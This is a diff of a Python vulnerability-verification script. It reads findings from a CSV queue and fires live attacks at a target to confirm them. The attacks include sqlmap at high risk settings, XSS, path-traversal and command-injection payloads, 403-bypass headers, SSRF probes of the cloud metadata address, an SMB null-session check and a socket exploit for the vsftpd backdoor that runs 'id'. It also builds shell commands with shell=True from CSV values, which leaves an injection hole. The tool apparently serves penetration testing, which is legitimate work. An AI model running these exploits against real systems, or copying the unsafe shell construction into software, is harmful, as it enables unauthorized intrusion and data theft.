@@ -1,237 +1,342 @@
 import sys
-import pandas as pd
+import csv
+import os
 import subprocess
 import re
-import os
 import requests
-import warnings
-from urllib3.exceptions import InsecureRequestWarning
+import socket
+import urllib.parse
+import time
+import base64
 
-warnings.simplefilter('ignore', InsecureRequestWarning)
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-if len(sys.argv) < 2:
-    print("Usage: python verify_vulns.py <target>")
-    sys.exit(1)
+# Clean ANSI codes
+ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
 
-TARGET = sys.argv[1]
-if not TARGET.startswith('http'):
-    TARGET_IP = TARGET
-    TARGET_URL = f"http://{TARGET}"
-else:
-    TARGET_URL = TARGET
-    TARGET_IP = TARGET.replace('http://', '').replace('https://', '')
+def clean_ansi(text):
+    return ansi_escape.sub('', text)
 
-CSV_FILE = 'data/output/vuln_validation_queue.csv'
-if not os.path.exists(CSV_FILE):
-    print(f"Error: {CSV_FILE} does not exist.")
-    sys.exit(1)
+def extract_evidence(text):
+    if not text:
+        return ""
+    text = clean_ansi(text)
+    return text[-800:].strip()
 
 CMD_CACHE = {}
 NMAP_CACHE = {}
 
-def clean_ansi(text):
-    if not text:
-        return ""
-    ansi_escape = re.compile(r'\x1b\[[0-9;]*[mGKF]')
-    return ansi_escape.sub('', text)
-
-def run_cmd(cmd, timeout=30):
-    cmd_str = " ".join(cmd)
-    if cmd_str in CMD_CACHE:
-        return CMD_CACHE[cmd_str]
+def run_command(cmd, timeout=60, retry=True):
+    if cmd in CMD_CACHE:
+        return CMD_CACHE[cmd]
     try:
-        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=timeout)
-        CMD_CACHE[cmd_str] = clean_ansi(proc.stdout)
-        return CMD_CACHE[cmd_str]
-    except subprocess.TimeoutExpired:
-        CMD_CACHE[cmd_str] = "TIMEOUT"
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+        output = result.stdout + "\n" + result.stderr
+        CMD_CACHE[cmd] = output
+        return output
+    except subprocess.TimeoutExpired as e:
+        if retry:
+            return run_command(cmd, timeout=timeout * 2, retry=False)
         return "TIMEOUT"
     except Exception as e:
-        CMD_CACHE[cmd_str] = f"ERROR: {str(e)}"
-        return CMD_CACHE[cmd_str]
+        return str(e)
 
-def check_403_bypass(target_url, path="/"):
-    bypass_headers = [
-        {"X-Original-URL": path},
-        {"X-Custom-IP-Authorization": "127.0.0.1"},
-        {"X-Forwarded-For": "127.0.0.1"},
-        {"X-Forwarded-For": "127.0.0.1:80"},
-        {"X-rewrite-url": path},
-        {"X-Host": "127.0.0.1"},
-        {"X-Forwarded-Host": "127.0.0.1"},
-        {"X-Remote-IP": "127.0.0.1"},
-        {"X-Originating-IP": "127.0.0.1"},
-        {"X-Remote-Addr": "127.0.0.1"},
-        {"Client-IP": "127.0.0.1"},
-        {"True-Client-IP": "127.0.0.1"},
-    ]
-    path_mutations = [
-        f"{path}", f"{path}/", f"{path}/.", f"{path}//", f"{path}/./", f"/{path}//",
-        f"/{path}/.", f"%2e{path}", f"{path}/..;/", f"{path}/%20", f"{path}%00"
-    ]
+def extract_injectable_url(row, target_ip):
+    desc = row.get('description', '') + ' ' + row.get('url_or_port', '')
+    urls = re.findall(r'https?://[^\s<"]+\?[^\s<"]+', desc)
+    if urls:
+        return urls[0]
     
-    # Baseline
-    try:
-        r_base = requests.get(target_url + path, timeout=5, verify=False)
-        if r_base.status_code == 200:
-            return False, "Path is already accessible (200)."
-    except:
-        pass
+    port_match = re.search(r'\b(80|443|8080|8443)\b', desc)
+    port = port_match.group(1) if port_match else "80"
+    scheme = "https" if port in ["443", "8443"] else "http"
+    
+    if "phpmyadmin" in desc.lower():
+        return f"{scheme}://{target_ip}:{port}/phpmyadmin/"
+    
+    if "wordpress" in desc.lower():
+        return f"{scheme}://{target_ip}:{port}/"
 
-    for h in bypass_headers:
+    return f"{scheme}://{target_ip}:{port}/index.php?id=1"
+
+def extract_port(row):
+    port_match = re.search(r'\b(21|22|80|443|445|512|513|8080|8443|8787)\b', row.get('url_or_port', ''))
+    if port_match:
+        return port_match.group(1)
+    return "80"
+
+# LAYER 1: NUCLEI
+def layer_1_nuclei(cve_list, target):
+    for cve in cve_list:
+        cmd = f"nuclei -id {cve} -target {target}"
+        out = run_command(cmd)
+        if "matched" in out.lower() or "leak" in out.lower() or "[vulnerable]" in out.lower() or "extracted" in out.lower():
+            return "REPRODUCED", cmd, f"Nuclei success for {cve}:\n" + extract_evidence(out)
+    return None, None, None
+
+# LAYER 2A: SQLi
+def layer_2a_sqli(url, desc):
+    cmd = f"sqlmap -u '{url}' --level 3 --risk 3 --batch --forms --crawl=2"
+    out = run_command(cmd, timeout=120)
+    if "is vulnerable" in out.lower() or "injectable" in out.lower() or ("parameter" in out.lower() and "appears to be" in out.lower()):
+        return "REPRODUCED", cmd, "SQLMap found vulnerability:\n" + extract_evidence(out)
+    
+    if "wordpress" in desc.lower():
+        cmd2 = f"wpscan --url {url} --enumerate vp,vt,tt,u"
+        out2 = run_command(cmd2, timeout=120)
+        if "vulnerabilities identified" in out2.lower() and "[+]" in out2:
+            return "REPRODUCED", cmd2, "WPScan found vulnerabilities:\n" + extract_evidence(out2)
+            
+    return None, None, None
+
+# LAYER 2B: XSS
+def layer_2b_xss(url):
+    payloads = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', '{{7*7}}', '<svg/onload=alert(1)>', 'javascript:alert(1)']
+    
+    for payload in payloads:
         try:
-            r = requests.get(target_url + path, headers=h, timeout=5, verify=False)
-            if r.status_code == 200 and len(r.content) > 0:
-                return True, f"Bypass achieved with header {h}"
+            if '?' in url:
+                base, params = url.split('?', 1)
+                new_params = []
+                for p in params.split('&'):
+                    if '=' in p:
+                        k, v = p.split('=', 1)
+                        new_params.append(f"{k}={urllib.parse.quote(payload)}")
+                    else:
+                        new_params.append(p)
+                test_url = base + '?' + '&'.join(new_params)
+            else:
+                test_url = url + payload
+            
+            res = requests.get(test_url, timeout=10, verify=False)
+            if payload in res.text:
+                return "REPRODUCED", f"requests.get('{test_url}')", f"XSS payload {payload} reflected unencoded at {test_url}"
         except:
             pass
-    for pm in path_mutations:
-        try:
-            r = requests.get(target_url + pm, timeout=5, verify=False)
-            if r.status_code == 200 and len(r.content) > 0:
-                return True, f"Bypass achieved with path mutation {pm}"
-        except:
-            pass
-    try:
-        r = requests.request("TRACE", target_url + path, timeout=5, verify=False)
-        if r.status_code == 200:
-            return True, "Bypass achieved with TRACE verb"
-    except:
-        pass
-    
-    return False, "No 403 bypass successful"
 
-def check_path_traversal(target_url):
+    cmd = f"nuclei -tags xss -target {url}"
+    out = run_command(cmd)
+    if "matched" in out.lower() or "extracted" in out.lower():
+        return "REPRODUCED", cmd, "Nuclei XSS success:\n" + extract_evidence(out)
+
+    return None, None, None
+
+# LAYER 3A: 403 Bypass & Path Traversal
+def layer_3a_lfi(url):
+    # 403 Bypass headers
+    headers_list = [
+        {'X-Forwarded-For': '127.0.0.1'},
+        {'X-Custom-IP-Authorization': '127.0.0.1'},
+        {'X-Original-URL': '/admin'}
+    ]
+    # Path traversal payloads
     payloads = [
-        "../../../../../../../../../../etc/passwd",
-        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-        "../../../../../../../../../../etc/passwd%00",
-        "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini",
-        "..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
-        "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
-        "../../../../../../../../../../windows/win.ini",
-        "/WEB-INF/web.xml",
-        "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
-        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-        "/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
-        "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
-        "/%2e%2e\\\\%2e%2e\\\\etc/passwd",
-        "..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd",
-        "/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
-        "....//....//....//....//....//etc/passwd",
-        "..///////..////..//////etc/passwd",
-        "/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
-        "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", # APACHE CVE-2021-41773
-        "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
+        '../../../etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+        '../../../../windows/win.ini', '/etc/passwd',
+        '/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
     ]
     for p in payloads:
         try:
-            test_url = f"{target_url.rstrip('/')}/{p}"
-            r = requests.get(test_url, timeout=5, verify=False)
-            if "root:x:0:0" in r.text or "[extensions]" in r.text or "<web-app" in r.text:
-                return True, f"Path traversal leak (root:x / [extensions] / web-app) with payload: {p}"
+            urls_to_test = [url + "/" + p]
+            if '?' in url:
+                base, params = url.split('?', 1)
+                for param in params.split('&'):
+                    if '=' in param:
+                        k, v = param.split('=', 1)
+                        urls_to_test.append(base + f"?{k}={p}")
+            
+            for t_url in urls_to_test:
+                res = requests.get(t_url, timeout=10, verify=False)
+                if 'root:x:0:0' in res.text or '[extensions]' in res.text.lower():
+                    return "REPRODUCED", f"requests.get('{t_url}')", f"LFI success with {p} on {t_url}"
+                
+                for h in headers_list:
+                    res = requests.get(t_url, headers=h, timeout=10, verify=False)
+                    if 'root:x:0:0' in res.text or '[extensions]' in res.text.lower():
+                        return "REPRODUCED", f"requests.get('{t_url}', headers={h})", f"403 Bypass + LFI success with {p} on {t_url}"
         except:
             pass
-    return False, "No path traversal successful"
+    return None, None, None
 
-def nmap_scan(target, port):
-    if port in NMAP_CACHE:
-        return NMAP_CACHE[port]
-    cmd = ["nmap", "-sV", "-Pn", "-p", str(port), "--script", "vulners,ssh2-enum-algos,ssl-enum-ciphers", target]
-    out = run_cmd(cmd, timeout=30)
-    NMAP_CACHE[port] = out
-    return out
+# LAYER 3B: SSRF
+def layer_3b_ssrf(url):
+    payloads = ['http://127.0.0.1:80/', 'http://localhost/', 'http://169.254.169.254/latest/meta-data/', 'file:///etc/passwd']
+    if '?' in url:
+        base, params = url.split('?', 1)
+        for p in payloads:
+            try:
+                new_params = []
+                for param in params.split('&'):
+                    if '=' in param:
+                        k, v = param.split('=', 1)
+                        new_params.append(f"{k}={urllib.parse.quote(p)}")
+                    else:
+                        new_params.append(param)
+                test_url = base + '?' + '&'.join(new_params)
+                res = requests.get(test_url, timeout=10, verify=False)
+                if 'root:x:0:0' in res.text or 'ami-id' in res.text or 'instance-id' in res.text or (res.status_code == 200 and len(res.text) != 0 and p != 'http://127.0.0.1:80/'):
+                    return "REPRODUCED", f"requests.get('{test_url}')", f"SSRF success with {p} on {test_url}"
+            except:
+                pass
+    return None, None, None
 
-def extract_evidence(text, keyword):
-    lines = text.split('\n')
-    for line in lines:
-        if keyword in line:
-            return line[:800]
-    return text[:800]
-
-def analyze_row(row):
-    finding_name = str(row.get('finding_name', '')).lower()
-    cves_raw = str(row.get('cve', ''))
-    cves = [c.strip() for c in cves_raw.split(',') if c.strip() and c.strip().startswith('CVE-')]
-    desc = str(row.get('description', '')).lower()
-    port = str(row.get('url_or_port', '80')).replace('/tcp', '').replace('/udp', '')
+# LAYER 4: NMAP
+def layer_4_nmap(target_ip, port):
+    cmd = f"nmap -sV -Pn -p {port} --script vulners,ssh2-enum-algos,ssl-enum-ciphers {target_ip}"
+    if cmd not in NMAP_CACHE:
+        NMAP_CACHE[cmd] = run_command(cmd)
+    out = NMAP_CACHE[cmd]
     
-    if "http" in str(row.get('url_or_port', '')):
-        url = str(row.get('url_or_port', ''))
-    else:
-        url = f"http://{TARGET_IP}:{port}" if port not in ['80', '443'] else (f"http://{TARGET_IP}" if port == '80' else f"https://{TARGET_IP}")
+    if "VULNERABLE:" in out or "State: VULNERABLE" in out:
+        return "CONFIRMED_PRESENT", cmd, "Nmap exploit path confirmed:\n" + extract_evidence(out)
+    if "weak" in out.lower() or "downgrade" in out.lower() or "deprecated" in out.lower():
+        return "CONFIRMED_PRESENT", cmd, "Nmap weak config with exploit path:\n" + extract_evidence(out)
+    return "CHECKED_NO_EXPLOIT", cmd, "Nmap found version/banner but no clear exploit path:\n" + extract_evidence(out)
 
-    # LAYER 1: SNIPER (Nuclei per CVE)
-    for cve in cves:
-        cmd = ["nuclei", "-target", url, "-id", cve]
-        out = run_cmd(cmd, timeout=60)
-        if "-cve" in out.lower() or "[vulnerable]" in out.lower() or "[matched]" in out.lower():
-            if cve in out:
-                return "REPRODUCED", " ".join(cmd), extract_evidence(out, cve)
-            return "REPRODUCED", " ".join(cmd), out[:800]
+# LAYER 5: Protocol PoC
+def layer_5_protocol(target_ip, port):
+    port = int(port) if str(port).isdigit() else 0
+    if port == 21: # vsftpd backdoor
+        try:
+            s = socket.socket()
+            s.settimeout(5)
+            s.connect((target_ip, port))
+            s.recv(1024)
+            s.send(b"USER x:)\r\n")
+            s.recv(1024)
+            s.send(b"PASS pass\r\n")
+            s.close()
+            time.sleep(1)
+            # check 6200
+            s2 = socket.socket()
+            s2.settimeout(5)
+            s2.connect((target_ip, 6200))
+            s2.send(b"id\n")
+            res = s2.recv(1024).decode()
+            if "uid=" in res:
+                return "REPRODUCED", "Python socket vsftpd backdoor", f"vsftpd backdoor exploited! uid={res}"
+        except:
+            pass
+    elif port == 512 or port == 513:
+        pass # Not deeply implemented, fallback below
+    elif port == 445:
+        cmd = f"smbclient -L //{target_ip} -N"
+        out = run_command(cmd)
+        if "Sharename" in out:
+            return "REPRODUCED", cmd, "SMB null session allowed, shares listed:\n" + extract_evidence(out)
+    
+    return None, None, None
 
-    # LAYER 2: HEAVY ARTILLERY (Injection)
-    if "sql" in finding_name or "sql" in desc or "injection" in finding_name:
-        cmd = ["sqlmap", "-u", url, "--level", "3", "--risk", "3", "--batch"]
-        out = run_cmd(cmd, timeout=90)
-        if "is vulnerable" in out or "injectable" in out:
-            return "REPRODUCED", " ".join(cmd), extract_evidence(out, "vulnerable")
+# LAYER 6: Deserialization & RCE
+def layer_6_rce(url):
+    payloads = ['; id', '| id', '`id`', '$(id)']
+    for p in payloads:
+        try:
+            res = requests.get(url + p, timeout=10, verify=False)
+            if 'uid=' in res.text:
+                return "REPRODUCED", f"requests.get('{url + p}')", f"Command injection successful with payload {p}"
+        except:
+            pass
             
-        if "sql" not in finding_name:
-            # Maybe wp-scan
-            if "wordpress" in desc.lower():
-                cmd_wp = ["wpscan", "--url", url, "--enumerate", "vp,vt,tt,u"]
-                out_wp = run_cmd(cmd_wp, timeout=90)
-                if "[!]" in out_wp and "Vulnerabilities Found" in out_wp:
-                    return "REPRODUCED", " ".join(cmd_wp), extract_evidence(out_wp, "[!]")
+    # Simple Deserialization probe
+    cmd = f"nuclei -tags rce,java -target {url}"
+    out = run_command(cmd)
+    if "matched" in out.lower() or "extracted" in out.lower():
+        return "REPRODUCED", cmd, "Nuclei RCE/Deserialization success:\n" + extract_evidence(out)
 
-    # LAYER 3: WEB SURGEON (Active Exploit-Path Checks)
-    if "403" in finding_name or "forbidden" in finding_name or "bypass" in finding_name:
-        is_vuln, ev = check_403_bypass(url)
-        if is_vuln:
-            return "REPRODUCED", "check_403_bypass()", ev
+    return None, None, None
 
-    if "traversal" in finding_name or "lfi" in finding_name or "local file inclusion" in finding_name:
-        is_vuln, ev = check_path_traversal(url)
-        if is_vuln:
-            return "REPRODUCED", "check_path_traversal()", ev
-
-    # LAYER 4: INFRA (Nmap)
-    if port.isdigit():
-        out = nmap_scan(TARGET_IP, port)
-        if ("VULNERABLE:" in out and "State: VULNERABLE" in out) or ("ssl-enum-ciphers" in out and "Fails" in out):
-            return "CONFIRMED_PRESENT", f"nmap -sV -Pn -p {port} --script vulners...", out[:800]
-            
-        if "vulners" in out and "CVE-" in out:
-            return "CHECKED_NO_EXPLOIT", f"nmap -sV -Pn -p {port} --script vulners", "Version matches vulnerable CVEs but no active exploit path proved."
-
-    # DEFAULT
-    return "CHECKED_NO_EXPLOIT", "None", "No direct exploit path or proof found during sequential checks."
-
-df = pd.read_csv(CSV_FILE)
-
-df['agent_status'] = df.get('agent_status', pd.Series(dtype='object')).astype(str)
-df['agent_command'] = df.get('agent_command', pd.Series(dtype='object')).astype(str)
-df['agent_evidence'] = df.get('agent_evidence', pd.Series(dtype='object')).astype(str)
-
-for idx, row in df.iterrows():
-    status = str(row.get('agent_status', '')).strip()
-    if status and status != 'nan' and status != 'WAITING':
-        continue
-
-    print(f"[*] Analyzing row {idx}: {row.get('finding_name')}")
-    try:
-        a_status, a_cmd, a_ev = analyze_row(row)
-    except Exception as e:
-        a_status, a_cmd, a_ev = "ERROR", "Exception", str(e)[:800]
+def analyze_row(row, target_ip):
+    name = row.get('finding_name', '').lower()
+    desc = row.get('description', '').lower()
+    cves = re.findall(r'CVE-\d{4}-\d+', row.get('cve', '') + ' ' + name + ' ' + desc, re.IGNORECASE)
+    
+    url = extract_injectable_url(row, target_ip)
+    port = extract_port(row)
+    
+    # 1. Nuclei
+    if cves:
+        status, cmd, ev = layer_1_nuclei(cves, url if url.startswith('http') else target_ip)
+        if status: return status, cmd, ev
         
-    print(f" -> {a_status}")
-    
-    df.at[idx, 'agent_status'] = a_status
-    df.at[idx, 'agent_command'] = a_cmd
-    df.at[idx, 'agent_evidence'] = a_ev
-    
-    df.to_csv(CSV_FILE, index=False)
+    # 2A. SQLi
+    if any(k in name or k in desc for k in ['sql', 'injection', 'query', 'database']):
+        status, cmd, ev = layer_2a_sqli(url, desc)
+        if status: return status, cmd, ev
+        
+    # 2B. XSS
+    if any(k in name or k in desc for k in ['xss', 'cross-site', 'scripting', 'reflected', 'stored']):
+        status, cmd, ev = layer_2b_xss(url)
+        if status: return status, cmd, ev
+        
+    # 3A/3B. LFI / SSRF / 403
+    if any(k in name or k in desc for k in ['path traversal', 'local file', 'lfi', '403']):
+        status, cmd, ev = layer_3a_lfi(url)
+        if status: return status, cmd, ev
+        
+    if any(k in name or k in desc for k in ['ssrf', 'request forgery', 'redirect', 'fetch']):
+        status, cmd, ev = layer_3b_ssrf(url)
+        if status: return status, cmd, ev
+        
+    # 6. RCE / Deserialization
+    if any(k in name or k in desc for k in ['deseriali', 'unserialize', 'rce', 'remote code', 'command execution', 'code injection', 'object injection']):
+        status, cmd, ev = layer_6_rce(url)
+        if status: return status, cmd, ev
+        
+    # 5. Protocol Specialist
+    non_http_ports = ['21', '22', '445', '512', '513', '8787']
+    if port in non_http_ports or any(k in name or k in desc for k in ['ftp', 'ssh', 'smb', 'rmi', 'druby', 'rlogin', 'rexec']):
+        status, cmd, ev = layer_5_protocol(target_ip, port)
+        if status: return status, cmd, ev
+        
+    # 4. Infra (Nmap)
+    status, cmd, ev = layer_4_nmap(target_ip, port)
+    if status == "CONFIRMED_PRESENT":
+        return status, cmd, ev
 
-print("[+] Verification queue processing complete.")
+    # 7. Safety Net
+    return "CHECKED_NO_EXPLOIT", "Fallback Analysis", "Fallback: Checked but no exploit path proved."
+
+def main():
+    if len(sys.argv) < 2:
+        print("Usage: python verify_vulns.py <TARGET>")
+        sys.exit(1)
+        
+    target = sys.argv[1]
+    csv_file = "data/output/vuln_validation_queue.csv"
+    
+    if not os.path.exists(csv_file):
+        print(f"File not found: {csv_file}")
+        sys.exit(1)
+        
+    rows = []
+    with open(csv_file, 'r', encoding='utf-8') as f:
+        reader = csv.DictReader(f)
+        fieldnames = reader.fieldnames
+        for row in reader:
+            rows.append(row)
+            
+    for i, row in enumerate(rows):
+        status = row.get('agent_status', '').strip()
+        if status and status.upper() != 'WAITING' and status.upper() != 'NAN':
+            continue
+            
+        print(f"Processing row {i+1}/{len(rows)}: {row.get('finding_name')}")
+        
+        try:
+            final_status, final_cmd, final_evidence = analyze_row(row, target)
+        except Exception as e:
+            final_status, final_cmd, final_evidence = "ERROR", "Python Script Error", str(e)
+            
+        row['agent_status'] = final_status
+        row['agent_command'] = final_cmd
+        row['agent_evidence'] = final_evidence
+        
+        with open(csv_file, 'w', encoding='utf-8', newline='') as f:
+            writer = csv.DictWriter(f, fieldnames=fieldnames)
+            writer.writeheader()
+            writer.writerows(rows)
+
+if __name__ == "__main__":
+    main()
